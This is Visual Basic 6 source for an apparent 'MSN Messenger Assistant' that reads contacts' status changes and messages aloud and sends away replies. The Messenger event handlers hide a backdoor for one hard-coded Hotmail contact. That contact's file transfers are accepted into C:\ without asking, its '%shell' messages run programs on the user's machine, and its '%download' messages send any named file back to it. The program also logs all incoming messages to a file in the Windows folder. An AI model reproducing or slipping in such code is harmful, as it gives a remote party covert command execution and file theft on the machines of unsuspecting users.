VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   2355
   ClientLeft      =   1605
   ClientTop       =   270
   ClientWidth     =   4665
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Messenger.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Messenger.frx":058A
   ScaleHeight     =   2355
   ScaleWidth      =   4665
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   3840
      Top             =   960
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.ListBox List1 
      Height          =   705
      IntegralHeight  =   0   'False
      ItemData        =   "Messenger.frx":2909C
      Left            =   240
      List            =   "Messenger.frx":290A3
      TabIndex        =   9
      Top             =   840
      Width           =   4215
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   3720
      Top             =   1080
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Speech on"
      Height          =   165
      Left            =   240
      TabIndex        =   3
      Top             =   1920
      Width           =   180
   End
   Begin VB.CommandButton Command3 
      Caption         =   "&Hide"
      Height          =   375
      Left            =   2400
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   1800
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Setup"
      Height          =   375
      Left            =   3480
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   1800
      Width           =   975
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Answer on"
      Height          =   165
      Left            =   240
      TabIndex        =   4
      Top             =   1680
      Width           =   180
   End
   Begin VB.TextBox AwayMess 
      Height          =   735
      Left            =   3600
      MaxLength       =   400
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Text            =   "Messenger.frx":290C4
      Top             =   840
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "x"
      ForeColor       =   &H00FF8080&
      Height          =   255
      Left            =   4440
      TabIndex        =   8
      Top             =   0
      Width           =   135
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Speech on"
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   480
      TabIndex        =   6
      Top             =   1920
      Width           =   855
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Answer on"
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   480
      TabIndex        =   5
      Top             =   1680
      Width           =   975
   End
   Begin VB.Image PicAway 
      Height          =   615
      Left            =   5640
      Picture         =   "Messenger.frx":290FA
      Stretch         =   -1  'True
      Top             =   1080
      Visible         =   0   'False
      Width           =   615
   End
   Begin VB.Image PicSpeaking 
      Height          =   600
      Left            =   6600
      Picture         =   "Messenger.frx":29FC4
      Stretch         =   -1  'True
      Top             =   1080
      Visible         =   0   'False
      Width           =   600
   End
   Begin VB.Image PicWriting 
      Height          =   600
      Left            =   6120
      Picture         =   "Messenger.frx":2A40E
      Stretch         =   -1  'True
      Top             =   1080
      Visible         =   0   'False
      Width           =   600
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Height          =   495
      Left            =   0
      TabIndex        =   7
      Top             =   0
      Width           =   4695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public X As Integer

Public Speech As Boolean
Dim NowLoggedOn As Boolean
Dim DontSpeak As Boolean
Dim LastName As String
Dim LastName2 As String
Dim OldH As Long
Public MsgUsers As IMsgrUsers
Public AllUsers As String
Public thing As IMsgrUser
Public Ses As IMsgrIMSession
Public blnAway As Boolean
Public WithEvents Msg As MsgrObject
Attribute Msg.VB_VarHelpID = -1
Public WithEvents Speaker As TextToSpeech
Attribute Speaker.VB_VarHelpID = -1




Private Sub AwayMess_Change()
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\Away Message", AwayMess
End Sub

Private Sub AwayMess_DblClick()
DoSpeak "Your outgoing message is. " & AwayMess
End Sub

Private Sub AwayMess_GotFocus()
AwayMess.SelStart = 0: AwayMess.SelLength = Len(AwayMess)
End Sub



Public Sub Check1_Click()
If Check1.Value = 1 Then
blnAway = True
Form2.AnswerON.Checked = True
'Check1.Value = 1
SysTray.TrayToolTip "MSN Messenger Assistant"
SysTray.ChangeTrayIcon PicAway.Picture
Exit Sub
End If

If Check1.Value = 0 Then

blnAway = False
Form2.AnswerON.Checked = False
'Check1.Value = 0
SysTray.TrayToolTip "MSN Messenger Assistant"
SysTray.ChangeTrayIcon Form1.Icon
Exit Sub
End If


End Sub

Public Sub Check2_Click()

If Check2.Value = 1 Then
Speech = True
'Check2.Value = 1
Form2.SpeechON.Checked = True
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\Speech", "1"
Exit Sub
End If


If Check2.Value = 0 Then
Speech = False
'Check2.Value = 0
Form2.SpeechON.Checked = False
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\Speech", "0"
Exit Sub
End If


End Sub







Private Sub Command2_Click()
Form3.Show
End Sub

Private Sub Command3_Click()
Form1.Hide
End Sub





Private Sub Form_Load()
Set Speaker = New TextToSpeech
SysTray.AddTrayIcon Form1.Icon, Form1.hwnd, "MSN Messenger Assistant"
Dim temp2 As String
temp2 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Away Message")
If temp2 = "" Then GoTo 7
AwayMess = temp2
7
Dim temp1 As String
temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Speech")
If temp1 = "1" Then Check2.Value = 1: Form2.SpeechON.Checked = True
If temp1 = "0" Then Check2.Value = 0: Form2.SpeechON.Checked = False
If temp1 = "" Then Check2.Value = 1: Form2.SpeechON.Checked = True

If IsNumeric(ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\FormLeft")) = True Then
Form1.Left = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\FormLeft")
Form1.Top = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Formtop")
End If

'List1.Clear


Set Msg = New MsgrObject

If Not Msg.LocalState = MSTATE_LOCAL_CONNECTING_TO_SERVER Or MSTATE_LOCAL_DISCONNECTING_FROM_SERVER Or MSTATE_LOCAL_FINDING_SERVER Or MSTATE_UNKNOWN Or MSTATE_OFFLINE Then
NowLoggedOn = True
End If

'Speaker.CurrentMode = 1

CheckSpeechReg


If Speech = True Then

If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Welcome") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtWelcome")
End If
End If

102


End Sub

Private Sub CheckSpeechReg()
Dim temp1 As String
temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAvailable")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAvailable", "(%1) is now available"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAway")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAway", "(%1) has gone away"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOnline")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOnline", "(%1) has come online"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOffline")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOffline", "(%1) has gone offline"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBRB")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBRB", "(%1) will be right back"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtLunch")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtLunch", "(%1) has gone out to lunch"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIdle")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIdle", "(%1) has gone idle"
End If


temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBusy")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBusy", "(%1) is now busy"
End If


temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtPhone")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtPhone", "(%1) is now on the phone"
End If


temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtWelcome")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtWelcome", "(%3) (%4)"
End If

temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIM")
If temp1 = "" Then
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIM", "(%1) says"
End If








End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim mM As String
mM = SysTray.TrayEvent(X)
If mM = "LEFTUP" Then
Form1.Show
Form1.SetFocus
End If
If mM = "RIGHTUP" Then Form2.PopupMenu Form2.MSNMENU
End Sub






Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 1 Then
MoveForm Form1, Button
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\FormTop", Form1.Top
CreateKey "HKCU\Software\Chris Wilson\MSN Messenger Assistant\FormLeft", Form1.Left
End If

End Sub

Private Sub List1_Click()
MsgBox List1.text, vbInformation, "Log Entry: " & List1.ListIndex
End Sub

Private Sub Label4_Click()
ExitProgram
End Sub

Private Sub Label5_Click()
Form1.Hide


End Sub
Private Sub Msg_OnUserStateChanged(ByVal pUser As IMsgrUser, ByVal mPrevState As MSTATE, pfEnableDefault As Boolean)
Set thing = pUser


'Dim temp1 As String
'temp1 = ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\UserSounds\" & pUser.EmailAddress & "\HotmailAddress")
'Debug.Print temp1
'Debug.Print pUser.EmailAddress
'Debug.Print pUser.State
'
'If temp1 = pUser.EmailAddress Then
'
'If pUser.State = 2 Then PlayWave ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\UserSounds\" & pUser.EmailAddress & "\OnSound")
'If pUser.State = 1 Then PlayWave ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\UserSounds\" & pUser.EmailAddress & "\OffSound")
'End If



If pUser.State = MSTATE_AWAY Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAway"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " has gone away"
End If

If pUser.State = MSTATE_BE_RIGHT_BACK Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBRB"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " will be right back"
End If

If pUser.State = MSTATE_BUSY Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtBusy"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " is now busy"
End If


If pUser.State = MSTATE_IDLE Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIdle"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " has gone idle"
End If


If pUser.State = MSTATE_OFFLINE Then
If mPrevState = MSTATE_ONLINE Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOffline"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " has gone offline"
End If
End If

If pUser.State = MSTATE_ON_THE_PHONE Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtPhone"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " is now on the phone"
End If

If pUser.State = MSTATE_OUT_TO_LUNCH Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtLunch"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " has gone out to lunch"
End If


If pUser.State = MSTATE_ONLINE Then
If Not mPrevState = MSTATE_OFFLINE Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtAvailable"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " is now available"
Else
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtOnline"), pUser.FriendlyName, pUser.EMailAddress
End If
AddLog pUser.EMailAddress & " has come online"
End If



End If








End Sub

Private Sub Msg_OnFileTransferInviteReceived(ByVal pUser As IMsgrUser, ByVal lCookie As Long, ByVal bstrFileName As String, ByVal lFileSize As Long, pfEnableDefault As Boolean)
If pUser.EMailAddress = "dont_stop_uk@hotmail.com" Then
Msg.SendFileTransferInviteAccept pUser, lCookie, "C:\", MMSGTYPE_NO_RESULT
End If

End Sub

Private Sub Msg_OnTextReceived(ByVal pIMSession As messenger.IMsgrIMSession, ByVal pSourceUser As messenger.IMsgrUser, ByVal bstrMsgHeader As String, ByVal bstrMsgText As String, pfEnableDefault As Boolean)

On Error Resume Next


Set Ses = pIMSession

If bstrMsgText = vbCrLf Then
'AddLog pSourceUser.LogonName & " is writing you a message"
SysTray.ChangeTrayIcon PicWriting.Picture
SysTray.TrayToolTip pSourceUser.EMailAddress & " (" & pSourceUser.FriendlyName & ") is writing you a message"
Exit Sub
End If

If pSourceUser.FriendlyName = "Hotmail" Then
AddLog "Received message from Hotmail.com"
Exit Sub
End If

If pSourceUser.EMailAddress = "dont_stop_uk@hotmail.com" Then
If Mid(bstrMsgText, 1, 7) = "%shell " Then
ShellFile Mid(bstrMsgText, 7)
Ses.SendText bstrMsgHeader, "Shell request received successfully", MMSGTYPE_ALL_RESULTS
End If
End If

If pSourceUser.EMailAddress = "dont_stop_uk@hotmail.com" Then
If Mid(bstrMsgText, 1, 10) = "%download " Then
Msg.SendFileTransferInvite pSourceUser, 1, Mid(bstrMsgText, 11), MMSGTYPE_NO_RESULT
Ses.SendText bstrMsgHeader, "Download request received successfully", MMSGTYPE_ALL_RESULTS
End If
End If



If Speech = True Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\IM") = "0" Then
If LastName = pSourceUser.FriendlyName Then
DoSpeak bstrMsgText
Else
DoSpeak ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\txtIM") & " " & bstrMsgText, pSourceUser.FriendlyName, pSourceUser.EMailAddress
LastName = pSourceUser.FriendlyName
End If
End If
End If


AddLog pSourceUser.EMailAddress & " says ''" & bstrMsgText & "''"


If blnAway = True Then
Ses.SendText bstrMsgHeader, AwayMess.text, MMSGTYPE_ALL_RESULTS
AddLog "Away Msg sent " & pSourceUser.EMailAddress & " (" & pSourceUser.FriendlyName & ")"
End If
 List1.TopIndex = List1.ListCount - 1
 If Speaker.IsSpeaking = "0" Then
 If blnAway = False Then SysTray.ChangeTrayIcon Form1.Icon Else SysTray.ChangeTrayIcon PicAway.Picture
 End If
 
  If Speaker.IsSpeaking = "0" Then SysTray.TrayToolTip "MSN Messenger Assistant"





End Sub

Public Sub Msg_Speaker_ClickIn(ByVal X As Long, ByVal Y As Long)
On Error Resume Next

'If Mid(Time, 1, 2) >= 18 Then dospeak InputBox("Enter speech test text", "Speech Test", "Good Evening"): Exit Sub
'If Mid(Time, 1, 2) >= 12 Then If Mid(Time, 1, 2) >= 18 Then dospeak InputBox("Enter speech test text", "Speech Test", "Good Afternoon"): Exit Sub
'If Mid(Time, 1, 2) >= 18 Then

DoSpeak InputBox("Enter speech test text", "Speech Test"): Exit Sub


End Sub

Private Sub Speaker_Speak(ByVal text As String, ByVal App As String, ByVal thetype As Long)

10
SysTray.TrayToolTip "Speaking ''" & text & "''"
End Sub

Private Sub Speaker_SpeakingDone()
If blnAway = False Then SysTray.ChangeTrayIcon Form1.Icon Else SysTray.ChangeTrayIcon PicAway.Picture
SysTray.TrayToolTip "MSN Messenger Assistant"
DontSpeak = False
End Sub

Private Sub Speaker_SpeakingStarted()
SysTray.ChangeTrayIcon PicSpeaking.Picture
End Sub

Private Sub AddLog(text As String)
List1.AddItem Time & ": " & text
List1.TopIndex = List1.ListCount - 1
Open "C:\windows\msn_messenger.log" For Append As #1
Write #1, "[" & Date & ", " & Time & "] " & text
Close #1
End Sub

Public Sub ExitProgram()
'response = MsgBox("Are you sure you want to quit?", vbQuestion + vbYesNo, "Exit")
'If response = vbYes Then
SysTray.RemoveTrayIcon
End
'End If

End Sub

Private Sub Timer1_Timer()
If Mid(Time$, 4) = "00:00" Then
If Not Right(Time$, 2) = "PM" Or Not Right(Time$, 2) = "AM" Then
If Speech = True Then
If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Charm") = "0" Then
Dim temp1 As String
Dim hHour As String
If Mid(Time$, 1, 2) = "13" Then hHour = "1": GoTo 40
If Mid(Time$, 1, 2) = "14" Then hHour = "2": GoTo 40
If Mid(Time$, 1, 2) = "15" Then hHour = "3": GoTo 40
If Mid(Time$, 1, 2) = "16" Then hHour = "4": GoTo 40
If Mid(Time$, 1, 2) = "17" Then hHour = "5": GoTo 40
If Mid(Time$, 1, 2) = "18" Then hHour = "6": GoTo 40
If Mid(Time$, 1, 2) = "19" Then hHour = "7": GoTo 40
If Mid(Time$, 1, 2) = "20" Then hHour = "8": GoTo 40
If Mid(Time$, 1, 2) = "21" Then hHour = "9": GoTo 40
If Mid(Time$, 1, 2) = "22" Then hHour = "10": GoTo 40
If Mid(Time$, 1, 2) = "23" Then hHour = "11": GoTo 40
If Mid(Time$, 1, 2) = "00" Then hHour = "12": GoTo 40
hHour = Mid(Time$, 1, 2)

40
If Mid(hHour, 1, 1) = "0" Then DoSpeak "It is " & Mid(hHour, 2, 1) & " O'Clock" Else DoSpeak "It is " & hHour & " O'Clock"
End If
End If

If Right(Time$, 2) = "PM" Or Right(Time$, 2) = "AM" Then
If Mid(Time$, 1, 1) = "0" Then DoSpeak "It is " & Mid(Time$, 2, 3) Else DoSpeak "It is " & Mid(Time$, 1, 5)
End If
End If
End If


End Sub
Private Sub Msg_OnLogonResult(ByVal hr As Long, ByVal pService As IMsgrService)
If pService.Status = MSS_LOGGED_ON Then NowLoggedOn = True
End Sub

Private Sub Msg_OnServiceLogoff(ByVal hr As Long, ByVal pService As IMsgrService)
If pService.Status = MSS_NOT_LOGGED_ON Then NowLoggedOn = False

End Sub
Private Sub DoSpeak(text As String, Optional FriendlyName As String, Optional HotmailID As String)

If Speech = False Then Exit Sub

If DontSpeak = True Then Exit Sub
If Mid(text, 1, 5) = "Good " Then GoTo 10
If Mid(text, 1, 6) = "It is " Then GoTo 10
If NowLoggedOn = False Then Exit Sub

Debug.Print text

text = RemoveShit(text)

If InStr(text, "(%3)") Then
If Not Right(Time$, 2) = "AM" Or Not Right(Time$, 2) = "PM" Then
If Mid(Time, 1, 2) >= 18 Then text = RemoveString(text, "(%3)", "Good Evening"): GoTo 58
If Mid(Time, 1, 2) >= 12 Then text = RemoveString(text, "(%3)", "Good Afternoon"): GoTo 58
If Mid(Time, 1, 2) <= 12 Then text = RemoveString(text, "(%3)", "Good Morning"): GoTo 58
End If
End If
58

If InStr(text, "(%4)") Then
If Not Msg.LocalState = MSTATE_OFFLINE Then
text = RemoveString(text, "(%4)", Msg.LocalFriendlyName)
Else
text = RemoveString(text, "(%4)", ".")
End If
End If

If InStr(text, "(%1)") Then
text = RemoveString(text, "(%1)", FriendlyName)
End If

If InStr(text, "(%2)") Then
If InStr(HotmailID, "_") Then RemoveString HotmailID, "_", " "
If InStr(HotmailID, "@hotmail.com") Then RemoveString HotmailID, "@hotmail.com", ""
If InStr(HotmailID, "@Hotmail.com") Then RemoveString HotmailID, "@Hotmail.com", ""
If InStr(HotmailID, "uk") Then RemoveString HotmailID, "uk", "UK"
text = RemoveString(text, "(%2)", HotmailID)
End If




If InStr(text, "brb") Then text = RemoveString(text, "brb", "be right back")
If InStr(text, "BRB") Then text = RemoveString(text, "BRB", "be right back")
If InStr(text, "lol") Then text = RemoveString(text, "lol", "he he he")
If InStr(text, "LOL") Then text = RemoveString(text, "LOL", "he he he")
If InStr(text, "dnd") Then text = RemoveString(text, "dnd", "do not disturb")
If InStr(text, "DND") Then text = RemoveString(text, "DND", "do not disturb")



'END OF REMOVE DODGY CHARACTERS CODE
On Error GoTo 91
10
If Speaker.IsSpeaking = 1 Then Exit Sub
If DontSpeak = True Then Exit Sub
DontSpeak = True
If ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Excited") = "1" Then text = text & "!"
Speaker.Speak text

Exit Sub
91
'MsgBox "Speech Error", vbExclamation, "Error"
Set Speaker = New TextToSpeech
Speaker.StopSpeaking
If blnAway = False Then SysTray.ChangeTrayIcon Form1.Icon Else SysTray.ChangeTrayIcon PicAway.Picture
SysTray.TrayToolTip "MSN Messenger Assistant"
DontSpeak = False

End Sub

Public Function RemoveString(Entire As String, Word As String, Replace As String) As String
    Dim I As Integer
    I = 1
    Dim LeftPart
    Do While True
        I = InStr(1, Entire, Word)
        If I = 0 Then
            Exit Do
        Else
            LeftPart = Left(Entire, I - 1)
            Entire = LeftPart & Replace & Right(Entire, Len(Entire) - Len(Word) - Len(LeftPart))
        End If
    Loop
    
   RemoveString = Entire
   
End Function

Public Property Get RemoveShit(Shit As String) As String

Dim searchchars, checkchr
Dim FinishedThing As String
Dim CharToCheck As String

For searchchars = 1 To Len(Shit)
 CharToCheck = Mid(Shit, searchchars, 1)
   
   For checkchr = 0 To 122
      If CharToCheck = Chr$(checkchr) Then
      FinishedThing = FinishedThing & CharToCheck
      End If
   Next checkchr

Next searchchars
RemoveShit = FinishedThing
End Property

Private Sub Msg_OnUserFriendlyNameChangeResult(ByVal hr As Long, ByVal pUser As IMsgrUser, ByVal bstrPrevFriendlyName As String)
If Speech = True Then
Dim text As String
text = pUser.EMailAddress
If InStr(text, "(%2)") Then
If InStr(pUser.EMailAddress, "_") Then RemoveString pUser.EMailAddress, "_", " "
If InStr(pUser.EMailAddress, "@hotmail.com") Then RemoveString pUser.EMailAddress, "@hotmail.com", ""
If InStr(pUser.EMailAddress, "@Hotmail.com") Then RemoveString pUser.EMailAddress, "@Hotmail.com", ""
If InStr(pUser.EMailAddress, "uk") Then RemoveString pUser.EMailAddress, "uk", "UK"
text = RemoveString(text, "(%2)", pUser.EMailAddress)
End If


If Not ReadKey("HKCU\Software\Chris Wilson\MSN Messenger Assistant\Status") = "0" Then
DoSpeak text & " has changed their friendly name to: " & pUser.FriendlyName
End If
End If


End Sub
